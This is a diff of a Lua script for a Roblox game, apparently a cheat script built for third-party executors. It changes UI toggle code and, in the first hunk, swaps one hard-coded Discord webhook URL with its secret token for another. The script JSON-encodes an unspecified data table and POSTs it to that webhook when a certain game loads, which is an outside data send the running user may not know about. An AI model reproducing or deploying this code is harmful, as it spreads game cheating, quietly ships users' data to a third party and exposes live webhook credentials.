@@ -45,7 +45,7 @@ if game.PlaceId == 7449423635 then
         local Encoded = HttpService:JSONEncode(Data)
     
         Request = http_request or request or HttpPost or syn.request
-        local Final1 = {Url = "https://discord.com/api/webhooks/1224363649557200967/L2CRbz-7Zdwb8PqsZ4w0VihOv5mhq1nXjiSw_-6_j3itFhak0fNPp6XhBnYh7blcQ7Ro" , Body = Encoded, Method = "POST", Headers = Headers}
+        local Final1 = {Url = "https://discord.com/api/webhooks/1226031008743428168/b9njPWrlkbTFOk2zTrGpyr87eyMYDhhtsHlqwwvMo_Vs6Q9RqSbh0qBIm3_T7qqyzyfV" , Body = Encoded, Method = "POST", Headers = Headers}
     
         Request(Final1)
     end
@@ -2517,7 +2517,7 @@ function BTP(p)
 		end)
 	end
 --------------------------------------------------------------------------------------------------------------------------------------------
---[[toggle ui 
+--toggle ui 
 local ScreenGui = Instance.new("ScreenGui")
 local ImageButton = Instance.new("ImageButton")
 local UICorner = Instance.new("UICorner")
@@ -2595,8 +2595,7 @@ local function YTZCAJC_fake_script()
 	end)
 end
 coroutine.wrap(YTZCAJC_fake_script)()
---]]
--- toggle ui
+--[[ toggle ui
 local L_91_ = Instance.new("ScreenGui")
 local L_92_ = Instance.new("ImageButton")
 local L_93_ = Instance.new("UICorner")
@@ -2609,14 +2608,15 @@ L_92_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 L_92_.BorderSizePixel = 0
 L_92_.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
 L_92_.Size = UDim2.new(0, 50, 0, 50)
-L_92_.BackgroundTransparency = 0
+L_92_.BackgroundTransparency = 1
 L_92_.Image = "rbxassetid://17015092259"
 L_92_.Draggable = true
 L_92_.MouseButton1Click:Connect(function()
-    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
+    game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.End,false,game)
 end)
 L_93_.CornerRadius = UDim.new(0, 15)
 L_93_.Parent = L_92_
+--]]
 --------------------------------------------------------------------------------------------------------------------------------------------
 --Remove Effect
 if game:GetService("ReplicatedStorage").Effect.Container:FindFirstChild("Death") then
